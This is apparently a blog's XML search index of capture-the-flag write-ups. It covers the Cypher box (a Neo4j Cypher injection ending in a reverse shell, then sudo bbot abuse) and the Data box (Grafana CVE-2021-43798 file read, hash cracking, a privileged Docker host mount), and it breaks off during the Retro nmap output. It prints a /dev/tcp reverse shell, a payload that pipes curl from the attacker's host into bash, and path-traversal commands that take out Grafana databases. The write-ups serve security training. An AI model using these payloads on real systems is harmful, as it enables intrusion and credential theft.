<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cypher (Linux Medium)</title>
    <url>/2025/03/14/Cypher/</url>
    <content><![CDATA[
Cypher is a Linux Medium box that starts with a website hosting a .jar file. Once downloaded and decompiled you find amongst them a CustomFunctions.class java file. Using jd-gui we are able to look at the source code of the file. The code reveals a attack vector inside a string that executes a system command. Using Cypher Injection we are able to obtain a reverse shell that gets us on the box as neo4j. Once on the box we look around to find a .yml file containing credentials. Trying with the other user gets us a shell as graphasm. We ssh in for stability, and check what permissions we have with sudo -l that reveals we can run bbot with sudo. Looking into the github and the man pages. We can force run a config through a dry run and have it abort before executing. Doing this we can obtain the root.txt file. 
Initial NmapPORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-title: Did not follow redirect to http://cypher.htb/|_http-server-header: nginx/1.24.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

HTTPLooking around we don’t see much interesting, therefore we can gobuster and see what’s hiding. 
/api is interesting enough, when we scan that we only see one endpoint.
$gobuster dir -u http://cypher.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://cypher.htb/api/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/auth                 (Status: 405) [Size: 31]
I presume this is an endpoint looking for authentication, therefore a POST request with something like username:password.
API EndpointSending a GET Request only provided a response in JSON telling us duhhh, most likely wants a POST Request for authentication. Also be weary as it could redirected us to /api/api/auth, so we need to remember to send our POST to /api/auth. 

Wonder if we can cause an error?? We can try a payload to see if we can get a neo4j version. Maybe we can get it to hit our server, yet fortnately we got an error which helps as well as and the version at the bottom I assuming.

HTTP/1.1 400 Bad RequestServer: nginx/1.24.0 (Ubuntu)Date: Fri, 14 Mar 2025 16:03:22 GMTContent-Length: 3257Connection: keep-aliveTraceback (most recent call last):  File &quot;/app/app.py&quot;, line 142, in verify_creds    results = run_cypher(cypher)  File &quot;/app/app.py&quot;, line 63, in run_cypher    return [r.data() for r in session.run(cypher)]  File &quot;/app/app.py&quot;, line 63, in &lt;listcomp&gt;    return [r.data() for r in session.run(cypher)]  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 378, in __iter__    self._connection.fetch_message()  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner    func(*args, **kwargs)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message    res = self._process_message(tag, fields)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message    response.on_failure(summary_metadata or &#123;&#125;)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure    raise Neo4jError.hydrate(**metadata)neo4j.exceptions.ClientError: &#123;code: Neo.ClientError.Statement.ExternalResourceFailed&#125; &#123;message: Invalid URL &#x27;http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community&#x27;: Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community ()&#125;During handling of the above exception, another exception occurred:Traceback (most recent call last):  File &quot;/app/app.py&quot;, line 165, in login    creds_valid = verify_creds(username, password)  File &quot;/app/app.py&quot;, line 151, in verify_creds    raise ValueError(f&quot;Invalid cypher query: &#123;cypher&#125;: &#123;traceback.format_exc()&#125;&quot;)ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;admin&#x27; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#x27;http://10.10.14.8/?version=&#x27; + version + &#x27;&amp;name=&#x27; + name + &#x27;&amp;edition=&#x27; + edition as l RETURN 0 as _0 //&#x27; return h.value as hash: Traceback (most recent call last):  File &quot;/app/app.py&quot;, line 142, in verify_creds    results = run_cypher(cypher)  File &quot;/app/app.py&quot;, line 63, in run_cypher    return [r.data() for r in session.run(cypher)]  File &quot;/app/app.py&quot;, line 63, in &lt;listcomp&gt;    return [r.data() for r in session.run(cypher)]  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py&quot;, line 378, in __iter__    self._connection.fetch_message()  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 178, in inner    func(*args, **kwargs)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py&quot;, line 860, in fetch_message    res = self._process_message(tag, fields)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py&quot;, line 370, in _process_message    response.on_failure(summary_metadata or &#123;&#125;)  File &quot;/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py&quot;, line 245, in on_failure    raise Neo4jError.hydrate(**metadata)neo4j.exceptions.ClientError: &#123;code: Neo.ClientError.Statement.ExternalResourceFailed&#125; &#123;message: Invalid URL &#x27;http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community&#x27;: Illegal character in query at index 44: http://10.10.14.8/?version=5.24.1&amp;name=Neo4j Kernel&amp;edition=community ()&#125;

Lets try sending a POST with some creds and maybe an error or mispelling.

JackPot!!! We can see what the expected expressions would be and how we should craft a payload. Lets move on for now.
Testing directory/testing looks interesting, once we check that out we find a directory listing with a .jar file.
$ gobuster dir -u http://cypher.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://cypher.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/login                (Status: 200) [Size: 3671]/index                (Status: 200) [Size: 4562]/api                  (Status: 307) [Size: 0] [--&gt; /api/docs]/about                (Status: 200) [Size: 4986]/demo                 (Status: 307) [Size: 0] [--&gt; /login]/.                    (Status: 200) [Size: 4562]/testing              (Status: 301) [Size: 178] [--&gt; http://cypher.htb/testing/]&lt;SNIP&gt;


Once we download the file we can unzip it like a normal .zip file. Lets list whats inside first. 
$ unzip -l custom-apoc-extension-1.0-SNAPSHOT.jarArchive:  custom-apoc-extension-1.0-SNAPSHOT.jar  Length      Date    Time    Name---------  ---------- -----   ----        0  2024-09-19 01:11   META-INF/       81  2024-09-19 01:11   META-INF/MANIFEST.MF        0  2024-09-19 01:11   com/        0  2024-09-19 01:11   com/cypher/        0  2024-09-19 01:11   com/cypher/neo4j/        0  2024-09-19 01:11   com/cypher/neo4j/apoc/      547  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class     1670  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure.class     3837  2024-09-19 01:11   com/cypher/neo4j/apoc/CustomFunctions.class      573  2024-09-19 01:11   com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class        0  2024-09-16 13:07   META-INF/maven/        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/        0  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/     1631  2024-09-16 13:07   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml       79  2024-09-19 01:11   META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties---------                     -------     8418                     15 files

Java Debug (Source Code Analysis)Now we have some .class files. Usually written in java, we can look at the source code using jd-gui.
$ jd-gui CustomFunctions.class

This will give us a window with our function. If we look we can see it making a system call. The ClassFunctions uses shell command curl to get the HTTP status code. It suppresses the output (-s), ensures no file saved (-o &#x2F;dev&#x2F;null), and sets a connection timeout (–connect-timeout 1). The curl command returns the HTTP status code using the -w flag and &#123;http_code&#125;. The primary issue lies in how the URL is passed into the shell command without sufficient validation or sanitization. This is were we can append arbritrary code.

FootHold and Payload CreationFirst we make our shell:
# shell.sh/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1
Now we have to craft a payload to try and hit our server. This should grab our payload and execute.
&quot;MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = &#x27;admin&#x27; MATHC&#x27; return h.value as hashANDString statusCode = inputReader.readLine();&quot;
So our payload might look something like this:
&#123;&quot;username&quot;:&quot;admin&#x27; return h.value as a UNION CALL custom.getUrlStatusCode(\&quot;cypher.htb;curl 10.10.14.8/shell.sh|bash;#\&quot;) YIELD statusCode AS a RETURN a; //&quot;,&quot;password&quot;:&quot;Password123&quot;&#125;

ExplanationUsing this in a POST Request we send the data as JSON. Though we are injecting our payload. We use h.value or u.name as our variable a then UNION CALL the function custom.getUrlStatusCode. Inside it we have our payload, which checks the status code of cypher.htb then curls our machine and executes our code. YIELD the statusCode as our variable a and return a.RETURN a will execute our code. We use \ to escape &quot; inside the parentheses. Then // at then end to comment out everything else.

Shell as neo4jLooking around we see graphasm in /home. Going into his home we find bbot_preset.yml which reveals credentials we can try for ssh.
neo4j@cypher:/$ cd /home/cd /home/neo4j@cypher:/home$ lslsgraphasmneo4j@cypher:/home$ cd *cd *neo4j@cypher:/home/graphasm$ lslsbbot_preset.ymluser.txtneo4j@cypher:/home/graphasm$ cat bbot_preset.ymlcat bbot_preset.ymltargets:  - ecorp.htboutput_dir: /home/graphasm/bbot_scansconfig:  modules:    neo4j:      username: neo4j      password: &lt;SNIP&gt;neo4j@cypher:/home/graphasm$
Shell as graphasmUsing the creds to get in via ssh we see what we can run with permissions, if any.
graphasm@cypher:~$ sudo -lMatching Defaults entries for graphasm on cypher:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_ptyUser graphasm may run the following commands on cypher:    (ALL) NOPASSWD: /usr/local/bin/bbot

PrivEscLooking into the man pages and seeing how we can abuse this. We have a couple of different flags we can look at.
-c = custom config-y = skip scan confirmation prompt--dry-run = abort before executing scan-d = debug (verbose/more info)

So we can try something like this that might reveal the flag for us.
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run  ______  _____   ____ _______ |  ___ \|  __ \ / __ \__   __| | |___) | |__) | |  | | | | |  ___ &lt;|  __ &lt;| |  | | | | | |___) | |__) | |__| | | | |______/|_____/ \____/  |_| BIGHUGE BLS OSINT TOOL v2.1.0.4939rcwww.blacklanternsecurity.com/bbot[DBUG] Preset bbot_cli_main: Adding module &quot;json&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;stdout&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;python&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;csv&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;txt&quot; of type &quot;output&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;aggregate&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;dnsresolve&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;cloudcheck&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;excavate&quot; of type &quot;internal&quot;[DBUG] Preset bbot_cli_main: Adding module &quot;speculate&quot; of type &quot;internal&quot;&lt;SNIP&gt;[DBUG] internal.excavate: Including Submodule URLExtractor[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt][DBUG] internal.excavate: Final combined yara rule contents: 784fdd4e2746a92781066bdf74593aa3
This reveals the root flag.

]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>neo4j</tag>
        <tag>java decompiler</tag>
        <tag>Cypher Injection</tag>
        <tag>github custom scanners</tag>
      </tags>
  </entry>
  <entry>
    <title>Data (Linux Easy)</title>
    <url>/2024/12/21/Data/</url>
    <content><![CDATA[
Data starts out with Grafana being ran on port 3000. We are able to use Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798) and exfil grafana.ini and grafana.db. Having these we can use a python script to convert this data and hashes to sha256 for hashcat. This gets us on the box as boris. Looking at his privileges we can execute docker exec. To get root privileges on the docker container we can run sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bash. From here we can see the filesystem df -h and since we’re root we can mkdir /tmp/pwnd and mount /dev/xXxXx /mnt/pwnd. This lets us read, write, and execute on host filesystem outside the container.
Initial NmapPORT     STATE SERVICE REASON         VERSION                                                 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)3000/tcp open  ppp?    syn-ack ttl 62      

HTTP (Port 3000 - Grafana)Going to this shows a login page with a version number at the bottom we can use.
Researching gave us CVE-2021-43798, where we can include files using Directory Traversal. So we can exfil the grafana.ini and the grafana.db
$ curl --path-as-is http://10.10.89.74:3000/public/plugins/mysql/../../../../../../../../../../etc/grafana/grafana.ini -o grafana.ini$ curl --path-as-is http://data.vl:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

Looking in the db file we see hashes for admin and boris. We note the password, and the salt. We can use a python script to generate sha256 hashes for use so we can crack them with hashcat.
grafana.db
CREATE TABLE `user` (                                                                          `id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL                                                , `version` INTEGER NOT NULL                                                                   , `login` TEXT NOT NULL                                                                                                                                                                       , `email` TEXT NOT NULL                                                                        , `name` TEXT NULL                                                                                                                                                                            , `password` TEXT NULL                                                                         , `salt` TEXT NULL                                                                             , `rands` TEXT NULL                                                                                                                                                                           , `company` TEXT NULL                                                                                                                                                                         , `org_id` INTEGER NOT NULL                                                                                                                                                                   , `is_admin` INTEGER NOT NULL                                                                                                                                                                 , `email_verified` INTEGER NULL                                                                                                                                                               , `theme` TEXT NULL                                                                                                                                                                           , `created` DATETIME NOT NULL                                                                                                                                                                 , `updated` DATETIME NOT NULL                                                                                                                                                                 , `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);                                                                          INSERT INTO user VALUES(1,0,&#x27;admin&#x27;,&#x27;admin@localhost&#x27;,&#x27;&#x27;,&#x27;7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&#x27;,&#x27;YObSoLj55S&#x27;,&#x27;hLLY6QQ4Y6&#x27;,&#x27;&#x27;,1,1,0,&#x27;&#x27;,&#x27;2022-01-23 12:48:04&#x27;,&#x27;2022-01-23 12:48:50&#x27;,0,&#x27;2022-01-23 12:48:50&#x27;,0);                                                                                                               INSERT INTO user VALUES(2,0,&#x27;boris&#x27;,&#x27;boris@data.vl&#x27;,&#x27;boris&#x27;,&#x27;&lt;SNIP&gt;f4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&#x27;,&#x27;&lt;SNIP&gt;&#x27;,&#x27;mYl941ma8w&#x27;,&#x27;&#x27;,1,0,0,&#x27;&#x27;,&#x27;2022-01-23 12:49:11&#x27;,&#x27;2022-01-23 12:49:11&#x27;,0,&#x27;2012-01-23 12:49:11&#x27;,0);

decryptor.py
import hashlibimport base64def calculate_hash(password, salt):    decoded_hash = bytes.fromhex(password)    salt_base64 = base64.b64encode(salt.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)    hash_base64 = base64.b64encode(decoded_hash).decode(&#x27;utf-8&#x27;)    return f&#x27;sha256:10000:&#123;salt_base64&#125;:&#123;hash_base64&#125;&#x27;# borisboris_password = &quot;&lt;SNIP&gt;34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&quot;boris_salt = &quot;&lt;SNIP&gt;&quot;boris_hash = calculate_hash(boris_password, boris_salt)# adminadmin_password = &quot;&lt;SNIP&gt;5cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8&quot;admin_salt = &quot;&lt;SNIP&gt;&quot;admin_hash = calculate_hash(admin_password, admin_salt)print(f&quot;[+] Boris hash: &#123;boris_hash&#125;&quot;)print(f&quot;[+] Admin hash: &#123;admin_hash&#125;&quot;)with open(&quot;hashes.txt&quot;, &quot;w&quot;) as file:    file.write(boris_hash + &quot;\n&quot;)    file.write(admin_hash + &quot;\n&quot;)

Running this script gave us hashes we can run through hashcat. 
[+] Boris hash: sha256:10000:&lt;REDACTED&gt;:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=[+] Admin hash: sha256:10000:&lt;REDACTED&gt;:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
Hashcat reveals a cleartext password for boris.
hashcat (v6.2.6) starting in autodetect mode                                                                                                                                                                                                                                         Hash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDF                   Dictionary cache hit:            * Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:&lt;REDATED&gt;

We can login to the site, but we can also ssh in as boris.
Shell as boris$ ssh boris@data.vl  boris@data.vl&#x27;s password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254boris@ip-10-10-10-11:~$
Doing some manual enumeration we find docker running, we can confirm by looking for a socket(usually &#x2F;run&#x2F;docker.sock). We also can see if we can read&#x2F;write to it.
boris@ip-10-10-10-11:~$ df -hFilesystem      Size  Used Avail Use% Mounted onudev            476M     0  476M   0% /devtmpfs            98M  876K   98M   1% /run/dev/xvda1      7.7G  1.6G  6.2G  20% /tmpfs           490M     0  490M   0% /dev/shmtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           490M     0  490M   0% /sys/fs/cgroup/dev/loop0       25M   25M     0 100% /snap/amazon-ssm-agent/4046/dev/loop1       56M   56M     0 100% /snap/core18/2253/dev/loop2       43M   43M     0 100% /snap/snapd/14066/dev/loop3      117M  117M     0 100% /snap/docker/1125tmpfs            98M     0   98M   0% /run/user/1001boris@ip-10-10-10-11:~$ find / -iname docker.sock 2&gt;/dev/null/run/docker.sockboris@ip-10-10-10-11:~$ ls -lsa /run/docker.sock0 srw-rw---- 1 root root 0 Dec 22 15:31 /run/docker.sockboris@ip-10-10-10-11:~$ 
We can look at his permissions and see we can use docker as well with root privileges.
boris@ip-10-10-10-11:~$ sudo -lMatching Defaults entries for boris on ip-10-10-10-11:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser boris may run the following commands on ip-10-10-10-11:    (root) NOPASSWD: /snap/bin/docker exec *

Docker PrivEscWe can use docker to escalate our privilege. We know the docker container running is grafana. We can use the --privileged flag to create a misconfig that will allow us to access the host filesystem. Also setting our -u to 0 (root user).
boris@ip-10-10-10-11:~$ sudo /snap/bin/docker exec --privileged -u 0 -it grafana /bin/bashbash-5.1# iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)bash-5.1# 
Looking at the filesystem once again. We have xvda1 we can mount to, this being to the filesystem the docker container is using.
bash-5.1# df -hFilesystem                Size      Used Available Use% Mounted onoverlay                   7.7G      1.5G      6.2G  20% /tmpfs                    64.0M         0     64.0M   0% /devtmpfs                   489.3M         0    489.3M   0% /sys/fs/cgroupshm                      64.0M         0     64.0M   0% /dev/shm/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/resolv.conf/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hostname/dev/xvda1                7.7G      1.5G      6.2G  20% /etc/hosts 
Let’s create a folder and mount it.
bash-5.1# mkdir /tmp/pwndbash-5.1# mount /dev/xvda1 /tmp/pwndbash-5.1# ls -alis /tmp/pwnd/total 104      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 . 258310      4 drwxrwxrwt    1 root     root          4096 Dec 22 17:17 ..     12      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 bin    180      4 drwxr-xr-x    3 root     root          4096 Nov 29  2021 boot    192      4 drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev    206      4 drwxr-xr-x   91 root     root          4096 Dec 22 15:31 etc   1637      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 home  55945      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img -&gt; boot/initrd.img-5.4.0-1060-aws  55943      0 lrwxrwxrwx    1 root     root            30 Nov 29  2021 initrd.img.old -&gt; boot/initrd.img-5.4.0-1060-aws   1640      4 drwxr-xr-x   20 root     root          4096 Nov 29  2021 lib   3837      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 lib64     11     16 drwx------    2 root     root         16384 Nov 29  2021 lost+found   3839      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 media   3840      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt   3841      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt   3842      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc   3843      4 drwx------    5 root     root          4096 Jan 23  2022 root   3846      4 drwxr-xr-x    5 root     root          4096 Nov 29  2021 run   3849      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 sbin   4069      4 drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap   4070      4 drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv   4071      4 drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys   4072      4 drwxrwxrwt   11 root     root          4096 Dec 22 16:49 tmp   4073      4 drwxr-xr-x   11 root     root          4096 Nov 29  2021 usr  60780      4 drwxr-xr-x   13 root     root          4096 Nov 29  2021 var  55944      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz -&gt; boot/vmlinuz-5.4.0-1060-aws  49497      0 lrwxrwxrwx    1 root     root            27 Nov 29  2021 vmlinuz.old -&gt; boot/vmlinuz-5.4.0-1060-awsbash-5.1# ls -alis /tmp/pwnd/root/total 28   3843      4 drwx------    5 root     root          4096 Jan 23  2022 .      2      4 drwxr-xr-x   23 root     root          4096 Dec 22 15:31 ..    181      0 lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -&gt; /dev/null 256239      4 drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local   3844      4 -rw-r--r--    1 root     root           148 Aug 17  2015 .profile 256089      4 drwx------    2 root     root          4096 Jan 23  2022 .ssh  56047      4 -rw-r--r--    1 root     root            37 Jan 23  2022 root.txt 256188      4 drwxr-xr-x    4 root     root          4096 Jan 23  2022 snapbash-5.1# 

]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>Grafana</tag>
        <tag>Docker Privileged Containers</tag>
      </tags>
  </entry>
  <entry>
    <title>Retro (Windows Easy)</title>
    <url>/2024/11/07/Retro/</url>
    <content><![CDATA[
Retro is a Easy Windows box working around pre-created windows 2000 machines. Pre-creating a computer means adding a computer to AD without using it to join a host to the domain right away, it just gets used later. There is a “Pre-Windows 2000” compatibility option that can be selected when creating a computer from ADUC, still present in Windows Server 2022. A computer created with this option will have a password equal to the computers name in lowercase without the ‘$’. This allows you to look at ADCS templates being used that are vulnerable, which leads to privilege escalation to Administrator.
Resource from Medium
Initial Nmap# Nmap 7.94SVN scan initiated Wed Nov  6 22:09:30 2024 as: /usr/lib/nmap/nmap -v -sVC -oN Evidence/Scans/initial.log 10.10.111.122Nmap scan report for 10.10.111.122Host is up (0.17s latency).Not shown: 988 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-07 03:09:44Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21|_ssl-date: TLS randomness does not represent time3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=DC.retro.vl| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl| Issuer: commonName=retro-DC-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-07T02:57:49| Not valid after:  2025-11-07T02:57:49| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da213389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: RETRO|   NetBIOS_Domain_Name: RETRO|   NetBIOS_Computer_Name: DC|   DNS_Domain_Name: retro.vl|   DNS_Computer_Name: DC.retro.vl|   Product_Version: 10.0.20348|_  System_Time: 2024-11-07T03:10:26+00:00|_ssl-date: 2024-11-07T03:11:05+00:00; -3s from scanner time.| ssl-cert: Subject: commonName=DC.retro.vl| Issuer: commonName=DC.retro.vl| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-11-06T03:06:43| Not valid after:  2025-05-08T03:06:43| MD5:   c32f:b344:a02e:2e77:7748:ca98:4f8e:3c20|_SHA-1: 2648:a57a:ffb0:819b:49a5:3f89:6fc2:54f2:9266:4e0bService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2024-11-07T03:10:30|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required|_clock-skew: mean: -2s, deviation: 0s, median: -2sRead data files from: /usr/share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed 